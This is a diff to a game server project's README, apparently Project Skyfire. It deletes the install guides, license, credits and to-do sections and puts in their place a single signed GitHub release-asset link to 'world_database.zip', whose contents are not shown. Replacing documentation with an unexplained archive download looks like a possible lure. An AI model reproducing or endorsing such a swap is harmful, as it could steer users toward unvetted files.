@@ -16,19 +16,4 @@ Windows | GCC | Clang
 ## Install
 Detailed installation guides are available in the wiki for
 
-[Windows](http://wiki.projectskyfire.org/index.php?title=Installation_Windows),
-[Linux](http://wiki.projectskyfire.org/index.php?title=Installation_Linux) and
-[Mac OSX](http://wiki.projectskyfire.org/index.php?title=Installation_Mac_OS_X).
-
-
-
-## Copyright
-License: GPL 2.0
-
-Read file [COPYING](COPYING.md)
-
-## Authors &amp; Contributors
-Read file [THANKS](THANKS.md)
-
-## To-Do List
-Read File [TO-DO](TODO.md)
+https://release-assets.githubusercontent.com/github-production-release-asset/784102148/78bd9775-e006-4abd-8a52-c572195dd532?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-01-14T08%3A41%3A52Z&rscd=attachment%3B+filename%3Dworld_database.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-01-14T07%3A40%3A56Z&ske=2026-01-14T08%3A41%3A52Z&sks=b&skv=2018-11-09&sig=aoyTUP8rtAEc0noODTGMCFQGrnIJXD5Qb3iw%2F86SX0M%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2ODM3ODI1NiwibmJmIjoxNzY4Mzc2NDU2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.t0RnvDcPlB92RqiS-XXQoTutQOFs4uffmL9WSwvWVtw&response-content-disposition=attachment%3B%20filename%3Dworld_database.zip&response-content-type=application%2Foctet-stream
